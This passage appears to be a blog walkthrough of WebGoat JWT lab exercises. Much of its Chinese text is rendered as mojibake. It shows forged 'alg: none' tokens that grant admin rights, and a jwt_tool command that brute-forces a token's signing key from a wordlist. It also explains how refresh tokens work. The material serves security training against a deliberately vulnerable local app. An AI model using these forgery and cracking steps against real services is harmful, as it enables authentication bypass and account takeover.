<p>è§£ç </p>
<p>å¤´éƒ¨çš„ç®—æ³•æ”¹æˆnone</p>
<p>payloadéƒ¨åˆ†çš„adminï¼šfalseæ”¹æˆtrue</p>
<p>ä¸¤ä¸ªéƒ¨åˆ†ç”¨base64åŠ å¯†ï¼ŒåŠ å¯†åæ‹¼æ¥åœ¨ä¸€èµ·å¦‚ä¸‹é¢çš„æ ¼å¼ï¼Œè®°å¾—å°æ•°ç‚¹</p>
<blockquote>
<p>å› ä¸ºåŠ å¯†åä¼šæœ‰=å·ï¼Œç„¶åjwtéœ€è¦æŠŠ=å»ç‚¹</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciIDogIm5vbmUiCn0.ewogICJhZG1pbiIgOiAidHJ1ZSIsCiAgImlhdCIgOiAxNzA0ODc4MTY1LAogICJ1c2VyIiA6ICJUb20iCn0.</span><br></pre></td></tr></table></figure>
<p>æ”¹å®Œå‘é€å°±è¡Œäº†</p>
<h4 id="6-5">6.</h4>
<p>è¿™æ˜¯å¯¹ç¬¬5é¢˜çš„è§£ç­”ï¼Ÿ</p>
<p>Solution<br>
The idea behind this assignment is that you can manipulate the token which might cause the server to interpret the token differently. In the beginning when JWT libraries appeared they implemented the specification to the letter meaning that the library took the algorithm specified inside the header and tried to work with it.</p>
<p>Signed JSON Web Tokens carry an explicit indication of the signing algorithm, in the form of the â€œalgâ€ Header Parameter, to facilitate cryptographic agility. This, in conjunction with design flaws in some libraries and applications, has led to several attacks:</p>
<p>The algorithm can be changed to â€œnoneâ€ by an attacker, and some libraries would trust this value and â€œvalidateâ€ the JWT without checking any signature.</p>
<p>An â€œRS256â€ (RSA, 2048 bit) parameter value can be changed into â€œHS256â€ (HMAC, SHA-256), and some libraries would try to validate the signature using HMAC-SHA256 and using the RSA public key as the HMAC shared secret (see [McLean] and [CVE-2015-9235]).</p>
<p>For mitigations, see Sections 3.1 and 3.2.</p>
<p>â€” <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>
What basically happened was that libraries just parsed the token as it was given to them without validating what cryptographic operation was used during the creation of the token.</p>
<p>Solution<br>
First note that we are logged in as so first select a different user for example: Tom. User Tom is allowed to vote as you can see, but he is unable to reset the votes. Looking at the request this will return an in the response:Guestaccess_token</p>
<p>GET <a target="_blank" rel="noopener" href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p>
<p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>
Decoding the token gives:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can change the claim to but then signature will become invalid. How do we end up with a valid signature? Looking at the RFC specification is a valid choice and gives an unsecured JWT. Letâ€™s change our token:adminfalsealg: none</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we use WebWolf to create our token we get:</p>
<p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>
Now we can replace the token in the cookie and perform the reset again. One thing to watch out for is to add a at the end otherwise the token is not validâ€¦</p>
<p>æº¶æ¶²<br>
æ­¤åˆ†é…èƒŒåçš„æƒ³æ³•æ˜¯ï¼Œæ‚¨å¯ä»¥æ“ä½œä»¤ç‰Œï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼è§£é‡Šä»¤ç‰Œã€‚ä¸€å¼€å§‹ï¼Œå½“ JWT åº“å‡ºç°æ—¶ï¼Œå®ƒä»¬å®ç°äº†è§„èŒƒï¼Œè¿™æ„å‘³ç€åº“é‡‡ç”¨äº†æ ‡å¤´ä¸­æŒ‡å®šçš„ç®—æ³•å¹¶å°è¯•ä½¿ç”¨å®ƒã€‚</p>
<p>ç­¾åçš„ JSON Web ä»¤ç‰Œå¸¦æœ‰ç­¾åçš„æ˜¾å¼æŒ‡ç¤º ç®—æ³•ï¼Œä»¥ â€œalgâ€ Header Parameter çš„å½¢å¼ï¼Œä»¥æ–¹ä¾¿ åŠ å¯†æ•æ·æ€§ã€‚è¿™ä¸è®¾è®¡ç¼ºé™·ç›¸ç»“åˆ ä¸€äº›åº“å’Œåº”ç”¨ç¨‹åºå¯¼è‡´äº†å‡ æ¬¡æ”»å‡»ï¼š</p>
<p>æ”»å‡»è€…å¯ä»¥å°†è¯¥ç®—æ³•æ›´æ”¹ä¸ºâ€œæ— â€ï¼Œå¹¶ä¸”æŸäº›ç®—æ³• åº“å°†ä¿¡ä»»æ­¤å€¼å¹¶â€œéªŒè¯â€JWTï¼Œè€Œæ— éœ€ æ£€æŸ¥ä»»ä½•ç­¾åã€‚</p>
<p>â€œRS256â€ï¼ˆRSAï¼Œ2048 ä½ï¼‰å‚æ•°å€¼å¯ä»¥æ›´æ”¹ä¸º â€œHS256â€ï¼ˆHMACã€SHA-256ï¼‰ï¼Œä¸€äº›åº“ä¼šå°è¯•éªŒè¯ ä½¿ç”¨ HMAC-SHA256 å¹¶ä½¿ç”¨ RSA å…¬é’¥ä½œä¸º HMAC å…±äº«å¯†é’¥ï¼ˆè¯·å‚é˜… [McLean] å’Œ [CVE-2015-9235]ï¼‰ã€‚</p>
<p>æœ‰å…³ç¼“è§£æªæ–½ï¼Œè¯·å‚é˜…ç¬¬ 3.1 èŠ‚å’Œç¬¬ 3.2 èŠ‚ã€‚</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>
åŸºæœ¬ä¸Šå‘ç”Ÿçš„äº‹æƒ…æ˜¯ï¼Œåº“åªæ˜¯åœ¨æä¾›ç»™ä»–ä»¬çš„ä»¤ç‰Œæ—¶è§£æä»¤ç‰Œï¼Œè€Œæ²¡æœ‰éªŒè¯åœ¨åˆ›å»ºä»¤ç‰ŒæœŸé—´ä½¿ç”¨çš„åŠ å¯†æ“ä½œã€‚</li>
</ul>
<p>æº¶æ¶²<br>
é¦–å…ˆè¯·æ³¨æ„ï¼Œæˆ‘ä»¬å·²ç™»å½•ï¼Œå› æ­¤é¦–å…ˆé€‰æ‹©å…¶ä»–ç”¨æˆ·ï¼Œä¾‹å¦‚ï¼šTomã€‚ å¦‚æ‚¨æ‰€è§ï¼Œç”¨æˆ· Tom è¢«å…è®¸æŠ•ç¥¨ï¼Œä½†ä»–æ— æ³•é‡ç½®æŠ•ç¥¨ã€‚æŸ¥çœ‹è¯·æ±‚ï¼Œè¿™å°†åœ¨å“åº”ä¸­è¿”å›ï¼šGuestaccess_token</p>
<p>GET <a target="_blank" rel="noopener" href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p>
<p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>
è§£ç ä»¤ç‰Œç»™å‡ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥å°†å£°æ˜æ›´æ”¹ä¸ºï¼Œä½†ç­¾åå°†å¤±æ•ˆã€‚æˆ‘ä»¬å¦‚ä½•æœ€ç»ˆè·å¾—æœ‰æ•ˆçš„ç­¾åï¼Ÿ æŸ¥çœ‹ RFC è§„èŒƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„é€‰æ‹©ï¼Œå¹¶ç»™å‡ºäº†ä¸€ä¸ªä¸å®‰å…¨çš„ JWTã€‚ è®©æˆ‘ä»¬æ›´æ”¹æˆ‘ä»¬çš„ä»¤ç‰Œï¼šadminfalsealg: none</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ WebWolf åˆ›å»ºæˆ‘ä»¬çš„ä»¤ç‰Œï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ï¼š</p>
<p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>
ç°åœ¨æˆ‘ä»¬å¯ä»¥æ›¿æ¢ cookie ä¸­çš„ä»¤ç‰Œå¹¶å†æ¬¡æ‰§è¡Œé‡ç½®ã€‚éœ€è¦æ³¨æ„çš„ä¸€ä»¶äº‹æ˜¯åœ¨æœ«å°¾æ·»åŠ  aï¼Œå¦åˆ™ä»¤ç‰Œæ— æ•ˆã€‚.</p>
<h4 id="7-3">7.</h4>
<p>æŸ¥çœ‹parseClaimsJwt()çš„æºç æ³¨é‡Š</p>
<p>Parses the specified compact serialized JWT string based on the builderâ€™s current configuration state and returns the resulting unsigned plaintext JWT instance. This is a convenience method that is usable if you are confident that the compact string argument reflects an unsigned Claims JWT. An unsigned Claims JWT has a Claims body and it is not cryptographically signed. If the compact string presented does not reflect an unsigned Claims JWT, an UnsupportedJwtException will be thrown.</p>
<p>æ ¹æ®ç”Ÿæˆå™¨çš„å½“å‰é…ç½®çŠ¶æ€åˆ†ææŒ‡å®šçš„ç´§å‡‘åºåˆ—åŒ–JWTå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç»“æœçš„æ— ç­¾åæ˜æ–‡JWTå®ä¾‹ã€‚è¿™æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•ï¼Œå¦‚æœæ‚¨ç¡®ä¿¡ç´§å‡‘å­—ç¬¦ä¸²å‚æ•°åæ˜ äº†æœªç­¾åçš„å£°æ˜JWTï¼Œåˆ™å¯ä»¥ä½¿ç”¨ã€‚æœªç­¾åçš„ç´¢èµ”JWTå…·æœ‰ç´¢èµ”ä¸»ä½“ï¼Œå¹¶ä¸”å®ƒæ²¡æœ‰åŠ å¯†ç­¾åã€‚å¦‚æœæä¾›çš„ç´§å‡‘å­—ç¬¦ä¸²ä¸åæ˜ æœªç­¾åçš„å£°æ˜JWTï¼Œåˆ™å°†å¼•å‘UnsupportedJwtExceptionã€‚<br>
æŸ¥çœ‹parse()çš„æºç æ³¨é‡Š</p>
<p>Parses the specified compact serialized JWT string based on the builderâ€™s current configuration state and returns the resulting JWT or JWS instance. This method returns a JWT or JWS based on the parsed string. Because it may be cumbersome to determine if it is a JWT or JWS, or if the body/payload is a Claims or String with instanceof checks, the #parse(String,JwtHandler) method allows for a type-safe callback approach that may help reduce code or instanceof checks.</p>
<p>æ ¹æ®ç”Ÿæˆå™¨çš„å½“å‰é…ç½®çŠ¶æ€åˆ†ææŒ‡å®šçš„ç´§å‡‘åºåˆ—åŒ–JWTå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç»“æœçš„JWTæˆ–JWSå®ä¾‹ã€‚æ­¤æ–¹æ³•æ ¹æ®è§£æçš„å­—ç¬¦ä¸²è¿”å›JWTæˆ–JWSã€‚ç”±äºç¡®å®šå®ƒæ˜¯JWTè¿˜æ˜¯JWSï¼Œæˆ–è€…æ­£æ–‡/æœ‰æ•ˆè´Ÿè½½æ˜¯å¸¦æœ‰å®ä¾‹æ£€æŸ¥çš„å£°æ˜æˆ–å­—ç¬¦ä¸²å¯èƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œå› æ­¤#è§£æï¼ˆå­—ç¬¦ä¸²ï¼ŒJwtHandlerï¼‰æ–¹æ³•å…è®¸ä¸€ç§ç±»å‹å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™å¯èƒ½æœ‰åŠ©äºå‡å°‘ä»£ç æˆ–å®ä¾‹æ£€æŸ¥ã€‚</p>
<p>æ‰€ä»¥ç­”æ¡ˆæ˜¯</p>
<p>1</p>
<p>3</p>
<h4 id="8-2">8.</h4>
<p>è¿™ä¸ªéœ€è¦æ‰¾å·¥å…·ï¼Œå¯ä»¥ç”¨æç¤ºé‡Œé¢çš„hashcat</p>
<p>ä¹Ÿå¯ä»¥ç”¨jwt-tools</p>
<p>æˆ‘ç”¨çš„æ˜¯jwt-toolsï¼Œç„¶åå­—å…¸ç”¨æç¤ºé‡Œé¢çš„ï¼Œä¸‹è½½å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/first20hours/google-10000-english</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤å¦‚ä¸‹ï¼Œjwtè®°å¾—æ¢æˆè‡ªå·±çš„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py jwt -C -d å­—å…¸</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å‚æ•°-Cè¡¨ç¤ºå¯¹JWTè¿›è¡Œå‹ç¼©ï¼Œä»¥ç¼©çŸ­å­—èŠ‚é•¿åº¦ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å‚æ•°-dæŒ‡å®šäº†ä¸€ä¸ªå­—å…¸æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç”¨äºå°è¯•ç ´è§£JWTçš„å¯èƒ½å¯†é’¥åˆ—è¡¨ã€‚</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæç¤ºæˆ‘çš„å¯†é’¥æ˜¯shipping</p>
<p>æŠŠå¯†é’¥æ¢ä¸Šå»ï¼Œç„¶åusernameæ¢æˆWebGoatï¼Œè¿˜æœ‰å°±æ˜¯æ—¶é—´é—®é¢˜</p>
<p>å› ä¸ºä»¤ç‰Œéƒ½æœ‰è‡ªå·±çš„æ—¶é—´ï¼Œå¦‚æœä¸æ”¹çš„è¯ä¼šæç¤º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT expired at 2023-12-31T16:31:50Z. Current time: 2023-12-31T18:47:35Z, a difference of 8145871 milliseconds. Allowed clock skew: 0 milliseconds.</span><br></pre></td></tr></table></figure>
<p>å³è¿‡æœŸäº†</p>
<p>expå°½é‡æ”¹å¤§äº›å°±è¡Œäº†</p>
<ol start="9">
<li></li>
</ol>
<p>Refreshing a token<br>
Introduction<br>
In this section we touch upon refreshing an access token.</p>
<p>Types of tokens<br>
In general there are two types of tokens: an access token and a refresh token. The access token is used for making API calls towards the server. Access tokens have a limited life span, thatâ€™s where the refresh token comes in. Once the access token is no longer valid a request can be made towards the server to get a new access token by presenting the refresh token. The refresh token can expire but their life span is much longer. This solves the problem of a user having to authenticate again with their credentials. Whether you should use a refresh token and an access token depends, below can find a couple of points to keep in mind while choosing which tokens to use.</p>
<p>So a normal flow can look like:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure>
<p>The server returns:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can see the refresh token is a random string which the server can keep track of (in memory or store in a database) in order to match the refresh token to the user the refresh token was granted to. So in this case whenever the access token is still valid we can speak of a â€œstatelessâ€ session, there is no burden on the server side to setup the user session, the token is self contained. When the access token is no longer valid the server needs to query for the stored refresh token to make sure the token is not blocked in any way.</p>
<p>Whenever the attacker gets a hold on an access token it is only valid for a certain amount of time (say 10 minutes). The attacker then needs the refresh token to get a new access token. That is why the refresh token needs better protection. It is also possible to make the refresh token stateless but this means it will become more difficult to see if the user revoked the tokens. After the server made all the validations it must return a new refresh token and a new access token to the client. The client can use the new access token to make the API call.</p>
<p>What should you check for?<br>
Regardless of the chosen solution you should store enough information on the server side to validate whether the user is still trusted. You can think of many things, like store the ip address, keep track of how many times the refresh token is used (using the refresh token multiple times in the valid time window of the access token might indicate strange behavior, you can revoke all the tokens and let the user authenticate again). Also keep track of which access token belonged to which refresh token otherwise an attacker might be able to get a new access token for a different user with the refresh token of the attacker (see <a target="_blank" rel="noopener" href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> for a nice write up about how this attack works) Also a good thing to check for is the ip address or geolocation of the user. If you need to give out a new token check whether the location is still the same if not revoke all the tokens and let the user authenticate again.</p>
<p>Need for refresh tokens<br>
Does it make sense to use a refresh token in a modern single page application (SPA)? As we have seen in the section about storing tokens there are two options: web storage or a cookie which mean a refresh token is right beside an access token, so if the access token is leaked chances are the refresh token will also be compromised. Most of the time there is a difference of course. The access token is sent when you make an API call, the refresh token is only sent when a new access token should be obtained, which in most cases is a different endpoint. If you end up on the same server you can choose to only use the access token.</p>
<p>As stated above using an access token and a separate refresh token gives some leverage for the server not to check the access token over and over. Only perform the check when the user needs a new access token. It is certainly possible to only use an access token. At the server you store the exact same information you would store for a refresh token, see previous paragraph. This way you need to check the token each time but this might be suitable depending on the application. In the case the refresh tokens are stored for validation it is important to protect these tokens as well (at least use a hash function to store them in your database).</p>
<p>åˆ·æ–°ä»¤ç‰Œ<br>
ä»‹ç»<br>
åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•åˆ·æ–°è®¿é—®ä»¤ç‰Œã€‚</p>
<p>tokenç±»å‹<br>
é€šå¸¸ï¼Œæœ‰ä¸¤ç§ç±»å‹çš„ä»¤ç‰Œï¼šè®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œã€‚è®¿é—®ä»¤ç‰Œç”¨äºåˆ¶ä½œ API å¯¹æœåŠ¡å™¨çš„è°ƒç”¨ã€‚è®¿é—®ä»¤ç‰Œçš„ç”Ÿå‘½å‘¨æœŸæœ‰é™ï¼Œè¿™å°±æ˜¯åˆ·æ–°ä»¤ç‰Œçš„ç”¨æ­¦ä¹‹åœ°ã€‚ä¸€æ¬¡ è®¿é—®ä»¤ç‰Œä¸å†æœ‰æ•ˆï¼Œå¯ä»¥å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œé€šè¿‡æä¾› åˆ·æ–°ä»¤ç‰Œã€‚åˆ·æ–°ä»¤ç‰Œå¯èƒ½ä¼šè¿‡æœŸï¼Œä½†å…¶ç”Ÿå‘½å‘¨æœŸè¦é•¿å¾—å¤šã€‚è¿™è§£å†³äº†ç”¨æˆ·çš„é—®é¢˜ å¿…é¡»ä½¿ç”¨å…¶å‡­æ®å†æ¬¡è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ˜¯å¦åº”ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œå’Œè®¿é—®ä»¤ç‰Œå–å†³äºï¼š ä¸‹é¢å¯ä»¥æ‰¾åˆ°åœ¨é€‰æ‹©è¦ä½¿ç”¨çš„ä»¤ç‰Œæ—¶è¦è®°ä½çš„å‡ ç‚¹ã€‚</p>
<p>å› æ­¤ï¼Œæ­£å¸¸æµç¨‹å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨è¿”å›ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æ‚¨æ‰€è§ï¼Œåˆ·æ–°ä»¤ç‰Œæ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼ŒæœåŠ¡å™¨å¯ä»¥è·Ÿè¸ªå®ƒï¼ˆåœ¨å†…å­˜ä¸­æˆ–å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼‰ ä¸ºäº†å°†åˆ·æ–°ä»¤ç‰Œä¸ç”¨æˆ·åŒ¹é…ï¼Œå·²å‘å…¶æˆäºˆåˆ·æ–°ä»¤ç‰Œã€‚ å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªè¦è®¿é—®ä»¤ç‰Œä»ç„¶æœ‰æ•ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯´æ˜¯â€œæ— çŠ¶æ€â€ä¼šè¯ï¼Œæœ‰ æœåŠ¡å™¨ç«¯æ²¡æœ‰è®¾ç½®ç”¨æˆ·ä¼šè¯çš„è´Ÿæ‹…ï¼Œä»¤ç‰Œæ˜¯è‡ªåŒ…å«çš„ã€‚ å½“è®¿é—®ä»¤ç‰Œä¸å†æœ‰æ•ˆæ—¶ï¼ŒæœåŠ¡å™¨éœ€è¦æŸ¥è¯¢å­˜å‚¨çš„åˆ·æ–°ä»¤ç‰Œï¼Œä»¥ç¡®ä¿ä»¤ç‰Œ ä¸ä¼šä»¥ä»»ä½•æ–¹å¼è¢«é˜»æ­¢ã€‚</p>
<p>æ¯å½“æ”»å‡»è€…ä¿ç•™è®¿é—®ä»¤ç‰Œæ—¶ï¼Œå®ƒä»…åœ¨ä¸€å®šæ—¶é—´ï¼ˆä¾‹å¦‚ 10 åˆ†é’Ÿï¼‰å†…æœ‰æ•ˆã€‚è¿™ ç„¶åï¼Œæ”»å‡»è€…éœ€è¦åˆ·æ–°ä»¤ç‰Œæ¥è·å–æ–°çš„è®¿é—®ä»¤ç‰Œã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåˆ·æ–°ä»¤ç‰Œéœ€è¦æ›´å¥½çš„ä¿æŠ¤ã€‚ ä¹Ÿå¯ä»¥ä½¿åˆ·æ–°ä»¤ç‰Œæ— çŠ¶æ€ï¼Œä½†è¿™æ„å‘³ç€å¦‚æœ ç”¨æˆ·åŠé”€äº†ä»¤ç‰Œã€‚ æœåŠ¡å™¨å®Œæˆæ‰€æœ‰éªŒè¯åï¼Œå¿…é¡»å‘å®¢æˆ·ç«¯è¿”å›æ–°çš„åˆ·æ–°ä»¤ç‰Œå’Œæ–°çš„è®¿é—®ä»¤ç‰Œã€‚è¿™ å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨æ–°çš„è®¿é—®ä»¤ç‰Œè¿›è¡Œ API è°ƒç”¨ã€‚</p>
<p>ä½ åº”è¯¥æ£€æŸ¥ä»€ä¹ˆï¼Ÿ<br>
æ— è®ºé€‰æ‹©å“ªç§è§£å†³æ–¹æ¡ˆï¼Œæ‚¨éƒ½åº”è¯¥åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œä»¥éªŒè¯ç”¨æˆ·æ˜¯å¦ ä»ç„¶å€¼å¾—ä¿¡èµ–ã€‚ä½ å¯ä»¥æƒ³åˆ°å¾ˆå¤šäº‹æƒ…ï¼Œæ¯”å¦‚å­˜å‚¨IPåœ°å€ï¼Œè·Ÿè¸ªåˆ·æ–°å¤šå°‘æ¬¡ ä½¿ç”¨ä»¤ç‰Œï¼ˆåœ¨è®¿é—®ä»¤ç‰Œçš„æœ‰æ•ˆæ—¶é—´çª—å£å†…å¤šæ¬¡ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œå¯èƒ½è¡¨ç¤ºå¥‡æ€ª è¡Œä¸ºï¼Œæ‚¨å¯ä»¥æ’¤é”€æ‰€æœ‰ä»¤ç‰Œå¹¶è®©ç”¨æˆ·å†æ¬¡è¿›è¡Œèº«ä»½éªŒè¯ï¼‰ã€‚ æ­¤å¤–ï¼Œè¿˜è¦è·Ÿè¸ªå“ªä¸ªè®¿é—®ä»¤ç‰Œå±äºå“ªä¸ªåˆ·æ–°ä»¤ç‰Œï¼Œå¦åˆ™æ”»å‡»è€…å¯èƒ½ä¼š èƒ½å¤Ÿä½¿ç”¨æ”»å‡»è€…çš„åˆ·æ–°ä»¤ç‰Œä¸ºå…¶ä»–ç”¨æˆ·è·å–æ–°çš„è®¿é—®ä»¤ç‰Œ ï¼ˆè¯·å‚é˜… <a target="_blank" rel="noopener" href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%EF%BC%8C%E4%BA%86%E8%A7%A3%E6%9C%89%E5%85%B3%E6%AD%A4%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%E7%B2%BE%E5%BD%A9%E6%96%87%E7%AB%A0%EF%BC%89">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ï¼Œäº†è§£æœ‰å…³æ­¤æ”»å‡»å¦‚ä½•å·¥ä½œçš„ç²¾å½©æ–‡ç« ï¼‰</a> å¦å¤–ï¼Œè¦æ£€æŸ¥çš„ä¸€ä»¶å¥½äº‹æ˜¯ç”¨æˆ·çš„ IP åœ°å€æˆ–åœ°ç†ä½ç½®ã€‚å¦‚æœæ‚¨éœ€è¦å‘å‡ºæ–°çš„ä»¤ç‰Œæ£€æŸ¥ 